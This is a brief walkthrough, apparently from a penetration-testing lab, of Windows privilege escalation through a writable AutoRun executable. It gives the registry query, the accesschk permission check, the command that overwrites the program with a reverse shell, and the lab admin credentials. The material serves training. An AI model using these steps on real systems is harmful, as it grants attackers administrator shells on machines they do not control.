Query the registry for AutoRun executables:

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

`C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Copy the revese shell executable you created and overwrite the AutoRun executable with it:

`copy C:\reverse_shell.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!  

`rdesktop 10.201.97.58`